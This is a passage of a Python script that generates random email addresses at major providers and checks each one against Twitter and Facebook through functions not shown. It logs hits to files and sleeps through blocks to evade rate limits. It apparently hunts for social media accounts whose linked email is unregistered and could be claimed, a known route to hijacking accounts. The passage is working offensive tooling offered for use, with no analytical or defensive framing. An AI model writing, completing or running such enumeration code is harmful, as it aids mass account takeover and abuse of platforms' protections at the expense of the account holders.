{BYellow}[{BWhite}3{BYellow}]{BWhite} - HOTMAIL  {BYellow}[{BWhite}4{BYellow}]{BWhite} - OUTLOOK
		{BWhite}
==============================
	''')
	domen_num=int(input(f'{BWhite}[{BYellow}+{BWhite}] - Choose : '))
	lingth=int(input(f'{BWhite}[{BYellow}+{BWhite}] - Lingth the email : '))
	while True:
		email=str("".join(random.choice(list)for i in range(lingth)))
		
		if domen_num == 1:
			domen='@gmail.com'
		elif  domen_num == 2:
			domen='@yahoo.com'
		elif  domen_num == 3:
			domen='@hotmail.com'
		elif  domen_num == 4:
			domen='@outlook.com'
		EMAIL=email+domen
		
		o=twitter(EMAIL,domen)
		sleep(5)
		print('\n\n')
		if o == 'block':
			print(' YOUR BLOCKED')
			block+=1
			for i in range(1800):
				time = 1800-i
				sleep(1)
				print(f'\r {White} Seconds [{time}]',end='')
		if o == 'bad':
			bad+=1
			print(White+' - - - - - - - - - - - - - - - - ')
			print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
			print(f'\n {White}Twitter  {Red}[x] {White}||{White} Email {Red}[x]')
			print(White+' - - - - - - - - - - - - - - - - ')
		if o == 'done':
			done+=1
			print(White+' - - - - - - - - - - - - - - - - ')
			print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
			print(f'\n {White}Twitter  {Green}[✓]{White} ||{White} Email {Green}[✓]')
			print(EMAIL)
			print(White+' - - - - - - - - - - - - - - - - ')
			open('done_twitter.txt','a+').write(str(EMAIL)+'\n')
			sleep(3)
		if o == 'email_good':
			bad+=1
			print(White+' - - - - - - - - - - - - - - - - ')
			print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
			print(f'\n {White}Twitter  {Red}[x]{White} ||{White} Email {Green}[✓]')
			print(White+' - - - - - - - - - - - - - - - - ')








if choose == 3:
	
	print(f'''
==============================

{BYellow}[{BWhite}1{BYellow}]{BWhite} - GMAIM    {BYellow}[{BWhite}2{BYellow}]{BWhite} - YAHOO
{BYellow}[{BWhite}3{BYellow}]{BWhite} - HOTMAIL  {BYellow}[{BWhite}4{BYellow}]{BWhite} - OUTLOOK
		{BWhite}
		
==============================
	''')
	domen_num=int(input(f'{BWhite}[{BYellow}+{BWhite}] - Choose : '))
	lingth=int(input(f'{BWhite}[{BYellow}+{BWhite}] - Lingth the email : '))
	while True:
		email=str("".join(random.choice(list)for i in range(lingth)))
		
		if domen_num == 1:
			domen='@gmail.com'
		elif  domen_num == 2:
			domen='@yahoo.com'
		elif  domen_num == 3:
			domen='@hotmail.com'
		elif  domen_num == 4:
			domen='@outlook.com'
		EMAIL=email+domen
		
		o=facebook(EMAIL,domen)
		sleep(6)
		print('\n\n')
		if o == 'block':
			print(' YOUR BLOCKED')
			block+=1
			for i in range(1800):
				time = 1800-i
				sleep(1)
				print(f'\r {White} Seconds [{time}]',end='')
		if o == 'bad':
			bad+=1
			print(' - - - - - - - - - - - - - - - - ')
			print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
			print(f'\n {White}Facebook  {Red}[x]{White} ||{White} Email {Red}[x]')
			print(' - - - - - - - - - - - - - - - - ')
		if o == 'done':
			done+=1
			print(White+' - - - - - - - - - - - - - - - - ')
			print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
			print(f'\n {White}Facebook  {Green}[✓] {White}||{White} Email {Green}[✓]')
			print(EMAIL)
			print(White+' - - - - - - - - - - - - - - - - ')
			open('done_facebook.txt','a+').write(str(EMAIL)+'\n')
			sleep(3)
		if o == 'email_good':
			bad+=1
			print(White+' - - - - - - - - - - - - - - - - ')
			
			print(f'\r  DONE{Green} [{done}] {White}| BAD {Red}[{bad}] {White}| BLOCK {Yellow}[{block}]')
			print(f'\n {White}Facebook  {Red}[x]{White} ||{White} Email {Green}[✓]')
			print(White+' - - - - - - - - - - - - - - - - ')
